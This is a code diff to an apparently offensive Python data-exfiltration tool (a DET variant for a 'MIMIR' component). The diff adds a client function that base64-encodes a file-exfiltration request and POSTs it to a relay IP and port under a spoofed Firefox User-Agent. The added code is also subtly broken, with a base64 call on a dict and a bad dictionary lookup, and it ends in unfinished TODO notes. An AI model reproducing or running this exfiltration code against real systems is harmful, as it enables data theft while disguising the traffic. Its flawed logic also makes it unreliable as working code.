@@ -9,6 +9,7 @@ import string
 import time
 import json
 import signal
+import base64
 import struct
 import tempfile
 from random import randint, uniform
@@ -16,6 +17,7 @@ from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
 from zlib import compress, decompress
+import requests
 
 try:
     from cStringIO import StringIO
@@ -345,8 +347,27 @@ def signal_handler(bla, frame):
     os.kill(os.getpid(), signal.SIGKILL)
 
 ## TODO: this is how the main MIMIR component will request exfil components
-def mimir_DET_client():
+def mimir_DET_client(path, file_to_exfil):
+    data = {}
+    data['path_data'] = {}
+    data['path_data']['index'] = 1
+    ## note: each path is a list of dict, where each dict has "ip" and "port" keys
+    data['path_data']['path'] = path
+    data['path_data']['file_to_end'] = file_to_exfil
+    data_to_send = {'data': base64.b64encode(data)}
 
+    next_ip = data['path_data'][1]['ip']
+    next_port = data['path_data'][1]['port']
+    target = "http://{}:{}".format(next_ip, next_port)
+    headers = requests.utils.default_headers()
+    headers.update({'User-Agent': "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"})
+    requests.post(target, data=data_to_send, headers=headers)
+
+    ## TODO: step (1) : consruct request for more of the data
+        ## okay, sketched above...
+    ## TODO: step (2) : be able to decipher the end information somehow...
+        ## note: w/ more thought... wouldn't this be a seperated process/function
+        ## and maybe I could leverage existing capabilities somehow??
     pass
 
 def main():
@@ -409,7 +430,7 @@ def main():
     elif results.microservice:
         plugins = app.get_plugins()
         plugin = plugins[0]
-        thread = threading.Thread(target=plugins[plugin]['microserivce_proxy'], args=(app,results.file,))
+        thread = threading.Thread(target=plugins[plugin]['microserivce_proxy'], args=(app,))
         #thread = ExfiltrateFile(app, file_to_send)
         threads.append(thread)
         thread.daemon = True
